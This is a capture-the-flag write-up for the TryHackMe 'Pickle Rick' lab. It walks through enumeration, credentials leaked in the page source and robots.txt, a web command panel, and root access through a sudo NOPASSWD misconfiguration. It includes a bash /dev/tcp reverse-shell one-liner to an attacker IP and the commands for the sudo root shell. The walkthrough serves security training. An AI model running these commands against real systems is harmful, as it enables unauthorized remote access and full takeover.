---

title: "Pickle Rick | TryHackMe Writeup"
date: 2026-09-30T22:01:57+05:30
description: "TryHackMe Pickle Rick writeup covering web enumeration, source-code information disclosure, robots.txt credential discovery, command execution, reverse shell access, file enumeration, and sudo-based privilege escalation."
summary: "Compromised the Pickle Rick machine by discovering a username in the website source code, recovering the password from robots.txt, accessing a command execution panel, obtaining a www-data reverse shell, discovering the potion ingredients, and escalating to root through unrestricted sudo privileges."
platform: "tryhackme"
difficulty: "easy"
os: "Linux"
status: "active"
featured: true
featured_image: "/images/writeups/tryhackme/Pickle-Rick.png"
tags: ["linux", "web-enumeration", "nmap", "ffuf", "source-code", "information-disclosure", "robots-txt", "credentials", "authentication", "command-execution", "rce", "reverse-shell", "www-data", "file-enumeration", "sudo", "sudo-misconfiguration", "nopasswd", "privilege-escalation", "root"]
skills: ["nmap", "ffuf", "web-enumeration", "source-code-analysis", "robots-txt", "credential-discovery", "command-execution", "netcat", "reverse-shell", "tty-upgrade", "linux-enumeration", "sudo", "bash", "privilege-escalation"]
comments: false
draft: false
------------

## Overview

<img width="842" height="438" alt="pickle-rick-tryhackme" src="/images/writeups/tryhackme/Pickle-Rick.png" />

Pickle Rick is an easy TryHackMe machine that focuses on web enumeration, information disclosure through source code and `robots.txt`, web-based command execution, reverse shell access, filesystem enumeration, and sudo-based privilege escalation.

The attack chain moves from source-code username disclosure → password discovery through `robots.txt` → authenticated command panel → `www-data` reverse shell → ingredient discovery → unrestricted `sudo` privileges → root.

### Key Vulnerabilities

* Username Disclosure Through Source Code
* Password Disclosure Through `robots.txt`
* Exposed Login Panel
* Web-Based OS Command Execution
* Remote Command Execution
* Reverse Shell as `www-data`
* Sensitive File Disclosure
* Unrestricted `sudo` Privileges
* `NOPASSWD: ALL` Misconfiguration
* Bash Privilege Escalation
* Root Privilege Escalation


---

## 🔎 Enumeration

First, let's scan the target for all open TCP ports using **Nmap**.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 10.49.157.20
```

#### Nmap Output

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 10.49.157.20
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 07:39 -0700
Nmap scan report for 10.49.157.20
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:d3:41:f3:e6:93:33:82:58:04:9a:4f:a3:d5:71:d7 (RSA)
|   256 5d:a3:e1:19:39:b0:95:22:8c:a2:3e:2f:88:53:24:3d (ECDSA)
|_  256 5c:09:42:b3:e7:4c:fe:20:a6:78:5a:a1:b2:be:c4:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.96 seconds
```

The scan shows two open ports:

* **22/tcp** — SSH
* **80/tcp** — HTTP

The web server is running **Apache 2.4.41 on Ubuntu**, with the page title: `Rick is sup4r cool`.

---

## 🌐 Web Enumeration

Let's open port `80` in a browser.

<img width="1918" height="851" alt="Screenshot_2026-09-30_07_42_52" src="https://github.com/user-attachments/assets/90869248-2c6b-48a4-90b0-ba141c44a2bc" />

The website displays a page containing the message:

> Help Morty!

Since web applications often contain useful information in their HTML source, let's inspect the source code.

<img width="1918" height="858" alt="Screenshot_2026-09-30_07_46_26" src="https://github.com/user-attachments/assets/20c064a7-d675-461d-b92e-dde8e4277ea8" />

The source code reveals the following username:

```text
R1ckRul3s1
```

This gives us a potential username to investigate further.

---

### 🔍 Directory Fuzzing

Next, let's enumerate hidden files and directories using **FFUF**.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-u http://10.49.157.20/FUZZ \
-fc 403 \
-e .php,.html
```

#### Results

```text
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.49.157.20/FUZZ -fc 403 -e .php,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.157.20/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Extensions       : .php .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 27ms]
denied.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
index.html              [Status: 200, Size: 1062, Words: 148, Lines: 38, Duration: 20ms]
index.html              [Status: 200, Size: 1062, Words: 148, Lines: 38, Duration: 21ms]
login.php               [Status: 200, Size: 882, Words: 89, Lines: 26, Duration: 25ms]
portal.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
robots.txt              [Status: 200, Size: 17, Words: 1, Lines: 2, Duration: 26ms]
:: Progress: [14253/14253] :: Job [1/1] :: 1709 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

Interesting files discovered:

* `login.php`
* `portal.php`
* `robots.txt`
* `denied.php`

The `robots.txt` file is particularly interesting because it may contain paths that the website administrator does not want search engines to index.

Checking it reveals the `password` required to access the login panel.

---

# 🔐 Login Panel

We can now navigate to:

```text
http://10.49.157.20/login.php
```

Using the username discovered in the source code and the password exposed through `robots.txt`, we successfully authenticate.

<img width="1918" height="864" alt="Screenshot_2026-09-30_08_13_58" src="https://github.com/user-attachments/assets/cd926908-9d34-49e1-8743-47e1a80aa9ce" />

After logging in, we are redirected to:

```text
portal.php
```

The page contains a **Command Panel**.

Since the interface appears to execute commands, let's test it with a simple `id` command.

```bash
id
```

<img width="1918" height="855" alt="Screenshot_2026-09-30_08_19_00" src="https://github.com/user-attachments/assets/701be407-759e-4b4a-bd3c-194d2989d2f4" />


This confirms that commands submitted through the panel are executed directly on the underlying operating system as the `www-data` user.

---

## 💻 Command Execution → Reverse Shell

Since we have arbitrary command execution, we can obtain a reverse shell.

First, start a Netcat listener on the attacking machine:

```bash
nc -lnvp 443
```

Then execute the following command through the web command panel:

```bash
bash -c 'bash -i > /dev/tcp/192.168.170.200/443 0>&1'
```

Our listener receives the connection:

```text
$ nc -lnvp 443                                     
listening on [any] 443 ...
connect to [192.168.170.200] from (UNKNOWN) [10.49.188.73] 49134
id ; whoami
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

We now have a reverse shell as: `www-data`

---

## 🖥️ Reverse Shell TTY Upgrade

The initial reverse shell is not a fully interactive terminal, so let's upgrade it.

Run:

```bash
script /dev/null -c bash
```

Press: `Ctrl + Z`

Then run:

```bash
stty raw -echo; fg
```

Reset the terminal:

```bash
reset xterm
```

Set the environment:

```bash
export TERM=xterm
export BASH=bash
```

Finally, set the terminal size:

```bash
stty cols 160 rows 45
```

We now have a more stable interactive TTY.

---

## 🧪 First Ingredient

Our shell starts in: `/var/www/html`

Let's enumerate the files.

```text
www-data@ip-10-49-188-73:/var/www/html$ ls    
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt  
denied.php
index.html
login.php
portal.php  
robots.txt
www-data@ip-10-49-188-73:/var/www/html$ 
```

The file:

```text
Sup3rS3cretPickl3Ingred.txt
```

contains the first ingredient.

### Task 1 — What is the first ingredient that Rick needs?

**Solution:**

```text
mr. ******* ****
```

---

## 🧪 Second Ingredient

Next, let's investigate Rick's home directory.

```bash
cd /home/rick/
ls -la
```

Output:

```text
www-data@ip-10-49-188-73:/$ cd /home/rick/
www-data@ip-10-49-188-73:/home/rick$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019  .
drwxr-xr-x 4 root root 4096 Feb 10  2019  ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 'second ingredients'
www-data@ip-10-49-188-73:/home/rick$ 
```

We discover a file named:

```text
second ingredients
```

This contains the second ingredient.

### Task 2 — What is the second ingredient in Rick's potion?

**Solution:**

```text
1 j**** ****
```

---

## 🔓 Privilege Escalation

We now need to obtain the final ingredient.

First, let's check the `sudo` permissions available to `www-data`.

```bash
sudo -l
```

Output:

```text
www-data@ip-10-49-188-73:/home/rick$ sudo -l
Matching Defaults entries for www-data on ip-10-49-188-73:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-49-188-73:
    (ALL) NOPASSWD: ALL
www-data@ip-10-49-188-73:/home/rick$ 
```

This is a critical misconfiguration.

The following entry:

```text
(ALL) NOPASSWD: ALL
```

means that `www-data` can execute commands as any user, including `root`, without providing a password.

Therefore, we can directly spawn a root shell.

---

## 👑 Root Shell

Run:

```bash
sudo bash -P
```

Verify our privileges:

```text
www-data@ip-10-49-188-73:/home/rick$ sudo bash -P
root@ip-10-49-188-73:/home/rick# id ; whoami
uid=0(root) gid=0(root) groups=0(root)
root
root@ip-10-49-188-73:/home/rick# 
```

We have successfully escalated from: `www-data → root`

---

## 🧪 Third Ingredient

The final ingredient is stored in:

```text
/root/3rd.txt
```

Read the file:

```bash
cat /root/3rd.txt
```

### Task 3 — What is the last and final ingredient?

**Solution:**

```text
***** **ice
```




---

## 🧾 Summary

| Stage | Technique                | Result                                             |
| ----- | ------------------------ | -------------------------------------------------- |
| 1     | Nmap enumeration         | Discovered SSH and HTTP                            |
| 2     | Source-code inspection   | Discovered username                                |
| 3     | Directory fuzzing        | Discovered `login.php`, `portal.php`, `robots.txt` |
| 4     | `robots.txt` enumeration | Discovered password                                |
| 5     | Web authentication       | Accessed Command Panel                             |
| 6     | Command execution        | Confirmed OS-level execution                       |
| 7     | Reverse shell            | Obtained `www-data` shell                          |
| 8     | File enumeration         | Found first and second ingredients                 |
| 9     | `sudo -l`                | Discovered `NOPASSWD: ALL`                         |
| 10    | Sudo abuse               | Obtained root                                      |
| 11    | `/root/3rd.txt`          | Found final ingredient                             |

---

## 🚀 Key Takeaways

* Always inspect the **HTML source** for leaked information.
* Enumerate common files such as `robots.txt`.
* Directory fuzzing can reveal hidden authentication and application endpoints.
* Test suspicious web functionality with harmless commands such as `id`.
* Once command execution is confirmed, a reverse shell can provide interactive access.
* Always run `sudo -l` during Linux privilege-escalation enumeration.
* `NOPASSWD: ALL` is a critical privilege-escalation misconfiguration because it allows unrestricted command execution as root.

---


